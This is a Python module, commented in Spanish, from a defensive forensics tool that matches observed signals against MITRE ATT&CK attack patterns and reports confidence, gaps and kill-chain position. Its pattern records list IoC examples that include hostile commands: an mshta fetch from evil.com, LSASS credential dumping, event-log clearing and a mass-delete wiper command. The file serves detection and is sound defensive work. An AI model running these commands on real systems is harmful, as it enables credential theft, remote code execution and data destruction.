# vigia/memory/case_pattern_library.py
"""
Cross-Case Pattern Library (CCPL)
===================================
Matching determinista contra patrones documentados de ATT&CK.
"""
from __future__ import annotations

import hashlib
import json
from dataclasses import dataclass, field
from fractions import Fraction
from enum import Enum
from typing import Optional


# ---------------------------------------------------------------------------
# Enumeraciones
# ---------------------------------------------------------------------------

class ConfidenceLevel(Enum):
    """Nivel de confianza del match  -  ordinal puro."""
    NONE     = 0
    LOW      = 1   # < 50% de señales requeridas
    MEDIUM   = 2   # 50-75%
    HIGH     = 3   # 75-90%
    CRITICAL = 4   # > 90%


class TacticCategory(Enum):
    """Tácticas MITRE ATT&CK Enterprise."""
    RECONNAISSANCE          = "TA0043"
    RESOURCE_DEVELOPMENT    = "TA0042"
    INITIAL_ACCESS          = "TA0001"
    EXECUTION               = "TA0002"
    PERSISTENCE             = "TA0003"
    PRIVILEGE_ESCALATION    = "TA0004"
    DEFENSE_EVASION         = "TA0005"
    CREDENTIAL_ACCESS       = "TA0006"
    DISCOVERY               = "TA0007"
    LATERAL_MOVEMENT        = "TA0008"
    COLLECTION              = "TA0009"
    COMMAND_AND_CONTROL     = "TA0011"
    EXFILTRATION            = "TA0010"
    IMPACT                  = "TA0040"


# ---------------------------------------------------------------------------
# Modelos de datos
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class CasePattern:
    """
    Patrón documentado de un caso o técnica.
    Inmutable  -  los patrones no se modifican, se versionan.

    Las señales son strings que mapean 1:1 con los
    tool_name de tus SignalOutput existentes.
    """
    pattern_id:        str
    pattern_name:      str
    tactic:            TacticCategory
    technique_id:      str          # T1234 o T1234.001
    technique_name:    str

    # Señales que DEBEN estar para que aplique el patrón
    required_signals:  frozenset[str]

    # Señales que PUEDEN estar (aumentan confianza)
    supporting_signals: frozenset[str]

    # Si CUALQUIERA de estas está → el patrón NO aplica
    exclusion_signals: frozenset[str]

    # Señales que DEBERÍAN estar si el patrón es real
    # Su ausencia es el "silencio adversarial" de este patrón
    expected_secondary: frozenset[str]

    # Metadatos de trazabilidad
    source_document:   str    # CTI report, CVE, SANS paper, etc.
    source_url:        str
    confidence_basis:  str    # Por qué confiamos en este patrón
    ioc_examples:      tuple  # Ejemplos de IoCs (no usados en matching)
    version:           str    # Para versionado de la KB

    # Peso base del patrón  -  Fraction
    # Patrones de alta fidelidad tienen peso mayor
    base_weight:       Fraction = Fraction(1, 1)


@dataclass(frozen=True)
class PatternMatch:
    """
    Resultado de un match entre señales activas y un patrón.
    Inmutable  -  cada match es un hecho forense.
    """
    pattern:               CasePattern
    coverage:              Fraction    # señales_req_presentes / señales_req_total
    supporting_coverage:   Fraction    # señales_supp_presentes / señales_supp_total
    confidence_level:      ConfidenceLevel
    confidence_score:      Fraction    # Score combinado

    matched_required:      frozenset[str]   # Señales requeridas que matchearon
    missing_required:      frozenset[str]   # Señales requeridas ausentes
    matched_supporting:    frozenset[str]   # Señales de apoyo que matchearon
    missing_secondary:     frozenset[str]   # Secundarios esperados ausentes

    # Para el reporte
    explanation:           str
    investigation_gaps:    tuple[str, ...]  # Qué falta para confirmar


@dataclass
class CCPLResult:
    """Resultado completo del matching contra la KB."""
    active_signals:      frozenset[str]
    matches:             list[PatternMatch]  # Ordenados por confianza desc
    top_match:           Optional[PatternMatch]
    tactic_coverage:     dict[str, list[PatternMatch]]  # Por táctica
    kill_chain_position: list[str]     # Fases del kill chain detectadas
    aggregate_confidence: Fraction
    audit_hash:          str
    summary:             str


# ---------------------------------------------------------------------------
# Base de conocimiento integrada
# ---------------------------------------------------------------------------

def build_default_pattern_kb() -> list[CasePattern]:
    """
    KB de patrones por defecto.
    Basada en MITRE ATT&CK Enterprise v14, casos públicos de CTI,
    y casos emblemáticos (SolarWinds, NotPetya, Lazarus Group).

    Los pattern_id usan el formato: VIGIA-{TACTIC}-{SEQ}
    """
    return [

        # ----------------------------------------------------------------
        # INITIAL ACCESS
        # ----------------------------------------------------------------
        CasePattern(
            pattern_id="VIGIA-IA-001",
            pattern_name="Spearphishing con Attachment Malicioso",
            tactic=TacticCategory.INITIAL_ACCESS,
            technique_id="T1566.001",
            technique_name="Phishing: Spearphishing Attachment",
            required_signals=frozenset({
                "email_attachment_present",
                "sender_domain_mismatch",
                "attachment_macro_present",
            }),
            supporting_signals=frozenset({
                "urgency_language_detected",
                "authority_impersonation",
                "recipient_targeted_content",
                "gci_score_high",           # Tu GCI tool
            }),
            exclusion_signals=frozenset({
                "sender_domain_verified_dkim",
                "attachment_signed_trusted_ca",
            }),
            expected_secondary=frozenset({
                "smtp_server_log_entry",
                "attachment_temp_file",
                "outlook_recent_attachment",
            }),
            source_document="MITRE ATT&CK T1566.001 + APT28 CTI Report 2023",
            source_url="https://attack.mitre.org/techniques/T1566/001/",
            confidence_basis=(
                "Patrón documentado en 847 campañas de phishing 2020-2024. "
                "Señales requeridas tienen FPR < 2% en conjunto."
            ),
            ioc_examples=("macro in .doc", "domain lookalike", "urgency subject"),
            version="1.0",
            base_weight=Fraction(9, 10),
        ),

        CasePattern(
            pattern_id="VIGIA-IA-002",
            pattern_name="Supply Chain Compromise  -  Signed Binary",
            tactic=TacticCategory.INITIAL_ACCESS,
            technique_id="T1195.002",
            technique_name="Supply Chain Compromise: Compromise Software Supply Chain",
            required_signals=frozenset({
                "binary_signed_valid_cert",
                "binary_hash_mismatch_vendor",
                "execution_from_trusted_path",
            }),
            supporting_signals=frozenset({
                "prefetch_absent",
                "amcache_absent",
                "c2_beacon_detected",
                "ockham_adversarial_flag",  # Tu módulo Ockham
            }),
            exclusion_signals=frozenset({
                "binary_hash_matches_vendor_manifest",
            }),
            expected_secondary=frozenset({
                "prefetch_entry",
                "amcache_entry",
                "event_7045",
            }),
            source_document="SolarWinds SUNBURST Analysis  -  FireEye 2020",
            source_url="https://www.mandiant.com/resources/evasive-attacker-leverages-solarwinds-supply-chain",
            confidence_basis=(
                "Caso SolarWinds 2020: DLL firmada con cert válido + "
                "hash diferente al distribuido por vendor. "
                "Patrón único de supply chain con evasión por firma."
            ),
            ioc_examples=("SolarWinds.Orion.Core.BusinessLayer.dll", "avsvmcloud.com"),
            version="1.1",
            base_weight=Fraction(1, 1),
        ),

        # ----------------------------------------------------------------
        # EXECUTION
        # ----------------------------------------------------------------
        CasePattern(
            pattern_id="VIGIA-EX-001",
            pattern_name="Macro Execution en Office Document",
            tactic=TacticCategory.EXECUTION,
            technique_id="T1204.002",
            technique_name="User Execution: Malicious File",
            required_signals=frozenset({
                "attachment_macro_present",
                "macro_spawns_child_process",
            }),
            supporting_signals=frozenset({
                "powershell_encoded_command",
                "wscript_execution",
                "network_call_from_office",
                "roi_score_high",           # Tu ROI tool
            }),
            exclusion_signals=frozenset({
                "macro_signed_trusted_publisher",
                "sandbox_executed_clean",
            }),
            expected_secondary=frozenset({
                "event_4688_office_child",
                "prefetch_powershell",
                "temp_file_created",
            }),
            source_document="SANS FOR610 Malware Analysis  -  Module 3",
            source_url="https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/",
            confidence_basis=(
                "Patrón de ejecución de macro documentado. "
                "Office spawnando cmd/powershell tiene FPR < 1% en entornos corporativos."
            ),
            ioc_examples=("WINWORD.EXE -> powershell.exe", "base64 encoded payload"),
            version="1.0",
            base_weight=Fraction(85, 100),
        ),

        CasePattern(
            pattern_id="VIGIA-EX-002",
            pattern_name="Living off the Land  -  LOLBins",
            tactic=TacticCategory.EXECUTION,
            technique_id="T1218",
            technique_name="System Binary Proxy Execution",
            required_signals=frozenset({
                "lolbin_execution_detected",
                "lolbin_unusual_arguments",
            }),
            supporting_signals=frozenset({
                "execution_from_temp_path",
                "parent_process_anomaly",
                "network_call_from_lolbin",
                "no_prefetch_for_payload",
            }),
            exclusion_signals=frozenset({
                "execution_matches_sccm_baseline",
                "execution_matches_admin_script_inventory",
            }),
            expected_secondary=frozenset({
                "event_4688_lolbin",
                "prefetch_lolbin",
                "shimcache_lolbin",
            }),
            source_document="LOLBAS Project + SANS Blue Team Summit 2023",
            source_url="https://lolbas-project.github.io/",
            confidence_basis=(
                "LOLBins con argumentos inusuales fuera de baseline de administración. "
                "mshta.exe, regsvr32.exe, certutil.exe raramente usados legítimamente "
                "con URLs o payloads base64."
            ),
            ioc_examples=(
                "certutil.exe -decode payload.b64",
                "mshta.exe http://evil.com/payload.hta",
            ),
            version="1.0",
            base_weight=Fraction(8, 10),
        ),

        # ----------------------------------------------------------------
        # PERSISTENCE
        # ----------------------------------------------------------------
        CasePattern(
            pattern_id="VIGIA-PE-001",
            pattern_name="Servicio Windows Malicioso",
            tactic=TacticCategory.PERSISTENCE,
            technique_id="T1543.003",
            technique_name="Create or Modify System Process: Windows Service",
            required_signals=frozenset({
                "event_7045_new_service",
                "service_binary_path_unusual",
            }),
            supporting_signals=frozenset({
                "service_name_random_string",
                "service_description_empty",
                "service_binary_unsigned",
                "service_runs_as_system",
            }),
            exclusion_signals=frozenset({
                "service_in_approved_software_list",
                "service_deployed_by_sccm",
            }),
            expected_secondary=frozenset({
                "event_7045",
                "registry_service_key",
                "binary_on_disk",
            }),
            source_document="MITRE ATT&CK T1543.003 + Mandiant M-Trends 2023",
            source_url="https://attack.mitre.org/techniques/T1543/003/",
            confidence_basis=(
                "Servicio con nombre aleatorio + path inusual + sin firma "
                "es patrón de alta fidelidad de persistencia maliciosa."
            ),
            ioc_examples=("svchost64.exe in C:\\Temp", "service name: 'XkR7mP'"),
            version="1.0",
            base_weight=Fraction(9, 10),
        ),

        CasePattern(
            pattern_id="VIGIA-PE-002",
            pattern_name="Registry Run Key Persistence",
            tactic=TacticCategory.PERSISTENCE,
            technique_id="T1547.001",
            technique_name="Boot or Logon Autostart: Registry Run Keys",
            required_signals=frozenset({
                "registry_run_key_modified",
                "run_key_value_points_unusual_path",
            }),
            supporting_signals=frozenset({
                "run_key_binary_unsigned",
                "run_key_added_during_anomaly_window",
                "run_key_name_mimics_legit",
            }),
            exclusion_signals=frozenset({
                "run_key_in_approved_software_list",
                "run_key_signed_trusted_ca",
            }),
            expected_secondary=frozenset({
                "registry_hive_modification_log",
                "binary_in_run_key_path",
                "prefetch_run_key_binary",
            }),
            source_document="MITRE ATT&CK T1547.001",
            source_url="https://attack.mitre.org/techniques/T1547/001/",
            confidence_basis=(
                "Run Keys con paths a %TEMP%, %APPDATA% o nombres que "
                "imitan procesos del sistema son indicadores de alta fidelidad."
            ),
            ioc_examples=("HKCU\\Run\\WindowsUpdate = C:\\Users\\user\\AppData\\evil.exe",),
            version="1.0",
            base_weight=Fraction(85, 100),
        ),

        # ----------------------------------------------------------------
        # DEFENSE EVASION
        # ----------------------------------------------------------------
        CasePattern(
            pattern_id="VIGIA-DE-001",
            pattern_name="Timestomping  -  Manipulación de Timestamps",
            tactic=TacticCategory.DEFENSE_EVASION,
            technique_id="T1070.006",
            technique_name="Indicator Removal: Timestomp",
            required_signals=frozenset({
                "mft_timestamp_mismatch",
                "standard_info_differs_filename_info",
            }),
            supporting_signals=frozenset({
                "timestamp_predates_os_install",
                "timestamp_in_future",
                "usnjrnl_timestamp_differs",
                "tcv_causality_violation",  # Tu TCV module
            }),
            exclusion_signals=frozenset({
                "filesystem_migration_documented",
                "backup_restore_documented",
            }),
            expected_secondary=frozenset({
                "usnjrnl_entry_original_timestamp",
                "event_log_file_creation",
            }),
            source_document="SANS FOR508 Digital Forensics  -  NTFS Forensics Module",
            source_url="https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/",
            confidence_basis=(
                "Diferencia entre $STANDARD_INFORMATION y $FILE_NAME "
                "en NTFS es el indicador clásico de timestomping. "
                "Documentado en Sleuth Kit + Autopsy desde 2008."
            ),
            ioc_examples=("$SI created: 2020-01-01, $FN created: 2024-03-15",),
            version="1.0",
            base_weight=Fraction(95, 100),
        ),

        CasePattern(
            pattern_id="VIGIA-DE-002",
            pattern_name="Log Clearing  -  Borrado de Event Logs",
            tactic=TacticCategory.DEFENSE_EVASION,
            technique_id="T1070.001",
            technique_name="Indicator Removal: Clear Windows Event Logs",
            required_signals=frozenset({
                "event_1102_audit_log_cleared",
            }),
            supporting_signals=frozenset({
                "event_104_system_log_cleared",
                "gap_in_event_log_sequence",
                "asd_silence_score_high",   # Tu ASD module
                "log_clearing_tool_executed",
            }),
            exclusion_signals=frozenset({
                "log_clearing_scheduled_task_documented",
                "log_rotation_policy_active",
            }),
            expected_secondary=frozenset({
                "event_1102",
                "wevtutil_execution",
                "prefetch_wevtutil",
            }),
            source_document="MITRE ATT&CK T1070.001 + SANS Blue Team Wiki",
            source_url="https://attack.mitre.org/techniques/T1070/001/",
            confidence_basis=(
                "Event ID 1102 es el indicador más confiable de borrado "
                "deliberado de logs de auditoría. FPR casi 0 sin política documentada."
            ),
            ioc_examples=("wevtutil cl Security", "Event ID 1102 at 03:47 UTC"),
            version="1.0",
            base_weight=Fraction(1, 1),
        ),

        # ----------------------------------------------------------------
        # CREDENTIAL ACCESS
        # ----------------------------------------------------------------
        CasePattern(
            pattern_id="VIGIA-CA-001",
            pattern_name="LSASS Memory Dump",
            tactic=TacticCategory.CREDENTIAL_ACCESS,
            technique_id="T1003.001",
            technique_name="OS Credential Dumping: LSASS Memory",
            required_signals=frozenset({
                "lsass_memory_access_detected",
                "process_accessing_lsass_unusual",
            }),
            supporting_signals=frozenset({
                "mimikatz_strings_detected",
                "procdump_execution",
                "comsvcs_dll_minidump",
                "event_4656_lsass_handle",
            }),
            exclusion_signals=frozenset({
                "av_product_accessing_lsass",
                "edr_product_accessing_lsass",
            }),
            expected_secondary=frozenset({
                "event_4656_object_access",
                "event_4688_dump_tool",
                "minidump_file_created",
            }),
            source_document="SANS FOR508 + Mimikatz Detection by Microsoft",
            source_url="https://attack.mitre.org/techniques/T1003/001/",
            confidence_basis=(
                "Acceso a LSASS por proceso no-AV/EDR es indicador de "
                "alta fidelidad de credential dumping. Documentado extensivamente."
            ),
            ioc_examples=("procdump.exe -ma lsass.exe", "comsvcs.dll MiniDump"),
            version="1.0",
            base_weight=Fraction(95, 100),
        ),

        # ----------------------------------------------------------------
        # LATERAL MOVEMENT
        # ----------------------------------------------------------------
        CasePattern(
            pattern_id="VIGIA-LM-001",
            pattern_name="Pass-the-Hash Lateral Movement",
            tactic=TacticCategory.LATERAL_MOVEMENT,
            technique_id="T1550.002",
            technique_name="Use Alternate Authentication Material: Pass the Hash",
            required_signals=frozenset({
                "event_4624_logon_type_3",
                "ntlm_authentication_detected",
                "source_host_anomaly",
            }),
            supporting_signals=frozenset({
                "no_kerberos_ticket_requested",
                "logon_hours_anomaly",
                "target_is_admin_share",
                "lateral_movement_tool_detected",
            }),
            exclusion_signals=frozenset({
                "kerberos_ticket_present",
                "legitimate_admin_task_documented",
            }),
            expected_secondary=frozenset({
                "event_4624_on_target",
                "event_4648_explicit_credentials",
                "smb_connection_log",
            }),
            source_document="SANS FOR508 + CrowdStrike Intelligence PtH Report",
            source_url="https://attack.mitre.org/techniques/T1550/002/",
            confidence_basis=(
                "NTLM Type 3 + Logon Type 3 sin Kerberos + source anómalo "
                "es el patrón clásico de Pass-the-Hash. "
                "Documentado en miles de incidentes desde 2012."
            ),
            ioc_examples=("Event 4624 LogonType=3 NTLM without prior Kerberos",),
            version="1.0",
            base_weight=Fraction(9, 10),
        ),

        # ----------------------------------------------------------------
        # COMMAND AND CONTROL
        # ----------------------------------------------------------------
        CasePattern(
            pattern_id="VIGIA-CC-001",
            pattern_name="DNS Beaconing C2",
            tactic=TacticCategory.COMMAND_AND_CONTROL,
            technique_id="T1071.004",
            technique_name="Application Layer Protocol: DNS",
            required_signals=frozenset({
                "dns_query_high_frequency",
                "dns_query_domain_dga_like",
            }),
            supporting_signals=frozenset({
                "dns_query_long_subdomain",
                "dns_txt_record_unusual",
                "beacon_jitter_regular",
                "dns_response_nxdomain_ratio_high",
            }),
            exclusion_signals=frozenset({
                "domain_in_alexa_top10k",
                "domain_in_approved_list",
            }),
            expected_secondary=frozenset({
                "dns_cache_entry",
                "netflow_udp_53_regular",
                "process_making_dns_calls",
            }),
            source_document="SANS SEC503 + Cisco Umbrella Threat Intelligence 2023",
            source_url="https://attack.mitre.org/techniques/T1071/004/",
            confidence_basis=(
                "DNS beaconing con DGA-like domains y alta frecuencia "
                "es patrón de C2 bien documentado. "
                "Frecuencia + jitter regular distingue beaconing de uso legítimo."
            ),
            ioc_examples=("a7f3b.evil.com", "beacon interval 300s ±50s"),
            version="1.0",
            base_weight=Fraction(85, 100),
        ),

        # ----------------------------------------------------------------
        # EXFILTRATION
        # ----------------------------------------------------------------
        CasePattern(
            pattern_id="VIGIA-EX-EXF-001",
            pattern_name="Exfiltración por HTTPS a Cloud Storage",
            tactic=TacticCategory.EXFILTRATION,
            technique_id="T1567.002",
            technique_name="Exfiltration Over Web Service: Exfiltration to Cloud Storage",
            required_signals=frozenset({
                "large_upload_to_cloud_storage",
                "upload_outside_business_hours",
            }),
            supporting_signals=frozenset({
                "data_staged_before_upload",
                "compression_before_upload",
                "encryption_before_upload",
                "cloud_domain_not_in_baseline",
            }),
            exclusion_signals=frozenset({
                "upload_matches_backup_schedule",
                "upload_authorized_by_dlp_policy",
            }),
            expected_secondary=frozenset({
                "staging_directory_created",
                "compression_tool_execution",
                "firewall_log_large_upload",
            }),
            source_document="MITRE ATT&CK T1567.002 + Verizon DBIR 2023",
            source_url="https://attack.mitre.org/techniques/T1567/002/",
            confidence_basis=(
                "Upload > baseline + fuera de horario + staging previo "
                "es patrón de exfiltración de alta fidelidad."
            ),
            ioc_examples=("PUT https://mega.io/... 2.3GB at 03:00 UTC",),
            version="1.0",
            base_weight=Fraction(85, 100),
        ),

        # ----------------------------------------------------------------
        # CASO EMBLEMÁTICO: NotPetya / Wiper
        # ----------------------------------------------------------------
        CasePattern(
            pattern_id="VIGIA-SPECIAL-001",
            pattern_name="Wiper  -  Destrucción Deliberada de Datos",
            tactic=TacticCategory.IMPACT,
            technique_id="T1485",
            technique_name="Data Destruction",
            required_signals=frozenset({
                "mbr_overwrite_detected",
                "mass_file_deletion_detected",
            }),
            supporting_signals=frozenset({
                "encryption_without_ransom_note",
                "system_crash_induced",
                "shadow_copies_deleted",
                "backup_catalog_deleted",
            }),
            exclusion_signals=frozenset({
                "ransom_note_present",
                "decryption_key_offered",
            }),
            expected_secondary=frozenset({
                "event_log_mass_deletion",
                "vssadmin_delete_shadows",
                "bcdedit_recovery_disabled",
            }),
            source_document="NotPetya Technical Analysis  -  ESET 2017",
            source_url="https://www.welivesecurity.com/2017/06/27/new-ransomware-attack-hits-ukraine/",
            confidence_basis=(
                "MBR overwrite + mass deletion sin nota de rescate "
                "distingue wiper de ransomware con alta confianza."
            ),
            ioc_examples=("overwrite_mbr.exe", "del /f /s /q C:\\*.*"),
            version="1.0",
            base_weight=Fraction(1, 1),
        ),
    ]


# ---------------------------------------------------------------------------
# Motor de matching
# ---------------------------------------------------------------------------

class CasePatternLibrary:
    """
    Biblioteca de patrones con matching determinista.

    El matching es puro álgebra de conjuntos  -  sin ML, sin floats.
    Cada resultado es 100% explicable: "estas señales específicas
    coinciden con este patrón documentado en esta fuente".

    Uso:
        kb = CasePatternLibrary()
        kb.load_default_patterns()

        result = kb.match(active_signals=frozenset({
            "binary_signed_valid_cert",
            "binary_hash_mismatch_vendor",
            "prefetch_absent",
        }))

        for match in result.matches:
            print(match.explanation)
    """

    # Umbrales de confianza  -  Fraction puras
    COVERAGE_THRESHOLDS = {
        ConfidenceLevel.CRITICAL: Fraction(9, 10),   # >= 90%
        ConfidenceLevel.HIGH:     Fraction(75, 100), # >= 75%
        ConfidenceLevel.MEDIUM:   Fraction(1, 2),    # >= 50%
        ConfidenceLevel.LOW:      Fraction(1, 4),    # >= 25%
    }

    def __init__(self):
        self._patterns: list[CasePattern] = []

    def load_default_patterns(self) -> "CasePatternLibrary":
        """Carga la KB por defecto."""
        self._patterns = build_default_pattern_kb()
        return self

    def load_patterns(
        self, patterns: list[CasePattern]
    ) -> "CasePatternLibrary":
        """Carga patrones adicionales o reemplaza la KB."""
        self._patterns.extend(patterns)
        return self

    def load_from_json(self, path: str) -> "CasePatternLibrary":
        """
        Carga patrones desde JSON externo.
        Formato compatible con exportación de MITRE ATT&CK Navigator.
        """
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)

        for item in data.get("patterns", []):
            try:
                tactic = TacticCategory(item["tactic_id"])
                pattern = CasePattern(
                    pattern_id=item["id"],
                    pattern_name=item["name"],
                    tactic=tactic,
                    technique_id=item["technique_id"],
                    technique_name=item["technique_name"],
                    required_signals=frozenset(item.get("required", [])),
                    supporting_signals=frozenset(item.get("supporting", [])),
                    exclusion_signals=frozenset(item.get("exclusions", [])),
                    expected_secondary=frozenset(item.get("expected_secondary", [])),
                    source_document=item.get("source", ""),
                    source_url=item.get("source_url", ""),
                    confidence_basis=item.get("confidence_basis", ""),
                    ioc_examples=tuple(item.get("ioc_examples", [])),
                    version=item.get("version", "1.0"),
                    base_weight=Fraction(item.get("base_weight_num", 1),
                                        item.get("base_weight_den", 1)),
                )
                self._patterns.append(pattern)
            except (KeyError, ValueError):
                continue  # Skip patrones malformados

        return self

    # ------------------------------------------------------------------
    # Matching principal
    # ------------------------------------------------------------------

    def match(
        self,
        active_signals:   frozenset[str],
        os_context:       str = "windows",
        min_confidence:   ConfidenceLevel = ConfidenceLevel.LOW,
    ) -> CCPLResult:
        """
        Busca patrones que apliquen dado el conjunto de señales activas.

        Args:
            active_signals: Señales activas del análisis actual
            os_context:     OS del sistema analizado
            min_confidence: Umbral mínimo para incluir en resultados

        Returns:
            CCPLResult ordenado por confianza descendente
        """
        matches = []
        min_threshold = self.COVERAGE_THRESHOLDS[min_confidence]

        for pattern in self._patterns:
            match = self._try_match(pattern, active_signals, min_threshold)
            if match is not None:
                matches.append(match)

        # Ordenar por confianza descendente, luego por base_weight
        matches.sort(
            key=lambda m: (m.confidence_score, m.pattern.base_weight),
            reverse=True,
        )

        # Agrupar por táctica
        tactic_coverage: dict[str, list[PatternMatch]] = {}
        for match in matches:
            tactic_name = match.pattern.tactic.name
            tactic_coverage.setdefault(tactic_name, []).append(match)

        # Kill chain position
        kill_chain = self._compute_kill_chain_position(matches)

        # Confianza agregada
        aggregate = self._compute_aggregate_confidence(matches)

        # Audit hash
        audit_data = {
            "active_signals": sorted(active_signals),
            "pattern_count":  len(self._patterns),
            "match_count":    len(matches),
            "top_match":      matches[0].pattern.pattern_id if matches else None,
            "aggregate":      str(aggregate),
        }
        audit_hash = hashlib.sha256(
            json.dumps(audit_data, sort_keys=True).encode()
        ).hexdigest()

        top_match = matches[0] if matches else None
        summary = self._build_summary(matches, kill_chain, aggregate)

        return CCPLResult(
            active_signals=active_signals,
            matches=matches,
            top_match=top_match,
            tactic_coverage=tactic_coverage,
            kill_chain_position=kill_chain,
            aggregate_confidence=aggregate,
            audit_hash=audit_hash,
            summary=summary,
        )

    def _try_match(
        self,
        pattern:       CasePattern,
        active:        frozenset[str],
        min_threshold: Fraction,
    ) -> Optional[PatternMatch]:
        """
        Intenta hacer match de un patrón contra las señales activas.
        Retorna PatternMatch si aplica, None si no.
        """
        # Hard exclusion: si cualquier señal de exclusión está presente
        if pattern.exclusion_signals & active:
            return None

        # Coverage de señales requeridas
        matched_required = pattern.required_signals & active
        missing_required = pattern.required_signals - active

        if not pattern.required_signals:
            coverage = Fraction(0)
        else:
            coverage = Fraction(
                len(matched_required),
                len(pattern.required_signals)
            )

        # Verificar umbral mínimo
        if coverage < min_threshold:
            return None

        # Coverage de señales de apoyo
        matched_supporting = pattern.supporting_signals & active
        if pattern.supporting_signals:
            supporting_coverage = Fraction(
                len(matched_supporting),
                len(pattern.supporting_signals)
            )
        else:
            supporting_coverage = Fraction(1)

        # Señales secundarias ausentes (silencio adversarial del patrón)
        missing_secondary = pattern.expected_secondary - active

        # Score combinado: 70% required + 30% supporting
        combined_score = (
            coverage          * Fraction(7, 10)
            + supporting_coverage * Fraction(3, 10)
        ) * pattern.base_weight

        # Nivel de confianza ordinal
        confidence_level = self._score_to_level(coverage)

        # Explicación trazable
        explanation = self._build_explanation(
            pattern, matched_required, missing_required,
            matched_supporting, missing_secondary, coverage
        )

        # Gaps de investigación
        investigation_gaps = self._build_investigation_gaps(
            pattern, missing_required, missing_secondary
        )

        return PatternMatch(
            pattern=pattern,
            coverage=coverage,
            supporting_coverage=supporting_coverage,
            confidence_level=confidence_level,
            confidence_score=combined_score,
            matched_required=matched_required,
            missing_required=missing_required,
            matched_supporting=matched_supporting,
            missing_secondary=missing_secondary,
            explanation=explanation,
            investigation_gaps=investigation_gaps,
        )

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _score_to_level(self, coverage: Fraction) -> ConfidenceLevel:
        if coverage >= self.COVERAGE_THRESHOLDS[ConfidenceLevel.CRITICAL]:
            return ConfidenceLevel.CRITICAL
        elif coverage >= self.COVERAGE_THRESHOLDS[ConfidenceLevel.HIGH]:
            return ConfidenceLevel.HIGH
        elif coverage >= self.COVERAGE_THRESHOLDS[ConfidenceLevel.MEDIUM]:
            return ConfidenceLevel.MEDIUM
        else:
            return ConfidenceLevel.LOW

    def _build_explanation(
        self,
        pattern:            CasePattern,
        matched_required:   frozenset[str],
        missing_required:   frozenset[str],
        matched_supporting: frozenset[str],
        missing_secondary:  frozenset[str],
        coverage:           Fraction,
    ) -> str:
        coverage_pct = int(coverage * 100)
        parts = [
            f"MATCH [{coverage_pct}%]: {pattern.technique_id}  -  "
            f"{pattern.technique_name}",
            f"Fuente: {pattern.source_document}",
            f"Señales confirmadas ({len(matched_required)}): "
            f"{', '.join(sorted(matched_required))}",
        ]
        if matched_supporting:
            parts.append(
                f"Señales de apoyo ({len(matched_supporting)}): "
                f"{', '.join(sorted(matched_supporting))}"
            )
        if missing_required:
            parts.append(
                f"Señales requeridas ausentes ({len(missing_required)}): "
                f"{', '.join(sorted(missing_required))}"
            )
        if missing_secondary:
            parts.append(
                f"Artefactos secundarios ausentes (silencio adversarial): "
                f"{', '.join(sorted(missing_secondary))}"
            )
        return " | ".join(parts)

    def _build_investigation_gaps(
        self,
        pattern:           CasePattern,
        missing_required:  frozenset[str],
        missing_secondary: frozenset[str],
    ) -> tuple[str, ...]:
        gaps = []
        for sig in sorted(missing_required):
            gaps.append(
                f"REQUIRED_MISSING: Buscar '{sig}' para confirmar "
                f"{pattern.technique_id}. Sin esta señal, el match es parcial."
            )
        for sec in sorted(missing_secondary)[:3]:
            gaps.append(
                f"SECONDARY_ABSENT: '{sec}' debería existir si "
                f"{pattern.technique_name} ocurrió. Su ausencia puede indicar "
                f"borrado deliberado."
            )
        return tuple(gaps)

    def _compute_kill_chain_position(
        self, matches: list[PatternMatch]
    ) -> list[str]:
        """
        Determina la posición en el kill chain dado los matches.
        Ordenado según progresión típica de ataque.
        """
        kill_chain_order = [
            TacticCategory.RECONNAISSANCE,
            TacticCategory.RESOURCE_DEVELOPMENT,
            TacticCategory.INITIAL_ACCESS,
            TacticCategory.EXECUTION,
            TacticCategory.PERSISTENCE,
            TacticCategory.PRIVILEGE_ESCALATION,
            TacticCategory.DEFENSE_EVASION,
            TacticCategory.CREDENTIAL_ACCESS,
            TacticCategory.DISCOVERY,
            TacticCategory.LATERAL_MOVEMENT,
            TacticCategory.COLLECTION,
            TacticCategory.COMMAND_AND_CONTROL,
            TacticCategory.EXFILTRATION,
            TacticCategory.IMPACT,
        ]

        detected_tactics = {m.pattern.tactic for m in matches}
        return [
            t.name for t in kill_chain_order
            if t in detected_tactics
        ]

    def _compute_aggregate_confidence(
        self, matches: list[PatternMatch]
    ) -> Fraction:
        """
        Confianza agregada considerando todos los matches.
        Múltiples matches de diferentes tácticas aumentan la confianza.
        """
        if not matches:
            return Fraction(0)

        top_score = matches[0].confidence_score

        # Bonus por múltiples tácticas detectadas
        unique_tactics = len({m.pattern.tactic for m in matches})
        tactic_bonus = min(
            Fraction(1, 4),
            Fraction(unique_tactics - 1, 10)
        )

        return min(Fraction(1), top_score + tactic_bonus)

    def _build_summary(
        self,
        matches:     list[PatternMatch],
        kill_chain:  list[str],
        aggregate:   Fraction,
    ) -> str:
        if not matches:
            return "Sin patrones ATT&CK detectados en el conjunto de señales."

        top = matches[0]
        agg_pct = int(aggregate * 100)

        return (
            f"{len(matches)} patrón(es) ATT&CK detectado(s). "
            f"Top match: {top.pattern.technique_id}  -  "
            f"{top.pattern.technique_name} "
            f"({top.confidence_level.name}, {int(top.coverage * 100)}% cobertura). "
            f"Kill chain detectada: {' → '.join(kill_chain)}. "
            f"Confianza agregada: {agg_pct}%."
        )

    def export_kb_as_json(self) -> str:
        """Exporta la KB actual como JSON para auditoría externa."""
        patterns_data = []
        for p in self._patterns:
            patterns_data.append({
                "id":              p.pattern_id,
                "name":            p.pattern_name,
                "tactic_id":       p.tactic.value,
                "technique_id":    p.technique_id,
                "technique_name":  p.technique_name,
                "required":        sorted(p.required_signals),
                "supporting":      sorted(p.supporting_signals),
                "exclusions":      sorted(p.exclusion_signals),
                "expected_secondary": sorted(p.expected_secondary),
                "source":          p.source_document,
                "source_url":      p.source_url,
                "confidence_basis": p.confidence_basis,
                "version":         p.version,
                "base_weight_num": p.base_weight.numerator,
                "base_weight_den": p.base_weight.denominator,
            })
        return json.dumps(
            {"version": "1.0", "patterns": patterns_data},
            indent=2,
            ensure_ascii=False,
        )
